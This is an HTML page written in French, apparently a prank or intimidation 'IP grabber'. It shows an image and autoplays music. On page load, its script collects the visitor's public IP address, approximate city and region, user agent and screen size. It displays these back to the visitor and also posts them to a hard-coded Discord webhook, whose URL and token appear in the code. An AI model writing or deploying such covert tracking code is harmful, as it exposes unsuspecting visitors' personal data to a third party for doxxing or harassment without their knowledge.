<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mog</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        #text {
            font-size: 24px;
            color: #333;
            text-align: center;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <img src="votre_image.jpg" alt="Image">
    <div id="text"></div>
    <audio id="backgroundMusic" autoplay loop>
        <source src="Savetik-Net_7535154023473712407_v2.mp3" type="audio/mpeg">
        Votre navigateur ne supporte pas l'élément audio.
    </audio>
    <script>
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Erreur lors de la récupération de l\'adresse IP:', error);
            }
        }

        function getUserAgent() {
            return navigator.userAgent;
        }

        async function fetchLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name
                };
            } catch (error) {
                console.error('Erreur lors de la récupération de la localisation:', error);
            }
        }

        function getScreenSize() {
            return `${window.screen.width}x${window.screen.height}`;
        }

        async function sendToDiscordWebhook(ip, userAgent, location, screenSize) {
            const webhookURL = 'https://discord.com/api/webhooks/1440972996503273515/XAfDYsyyMO0ddmp3SwhMDwSyuaTqstVYmC1gnMaPxFLZFwxJLuNbi71nQA-gCBoBtdp4';
            const payload = {
                content: `Adresse IP: ${ip}\nUser-Agent: ${userAgent}\nVille: ${location.city}\nRégion: ${location.region}\nPays: ${location.country}\nTaille de l'écran: ${screenSize}`
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    throw new Error('Erreur lors de l\'envoi du webhook');
                }
            } catch (error) {
                console.error('Erreur lors de l\'envoi du webhook:', error);
            }
        }

        function displayTextSlowly(text, element, delay = 50) {
            let index = 0;
            const interval = setInterval(() => {
                if (index < text.length) {
                    element.textContent += text.charAt(index);
                    index++;
                } else {
                    clearInterval(interval);
                }
            }, delay);
        }

        async function main() {
            const ip = await fetchIP();
            const userAgent = getUserAgent();
            const location = await fetchLocation(ip);
            const screenSize = getScreenSize();

            const text = `IP: ${ip}\nUser-Agent: ${userAgent}\nVille: ${location.city}\nRégion: ${location.region}\nPays: ${location.country}\nTaille de l'écran: ${screenSize}`;
            const textElement = document.getElementById('text');
            displayTextSlowly(text, textElement);

            await sendToDiscordWebhook(ip, userAgent, location, screenSize);
        }

        main();
    </script>
</body>
</html>
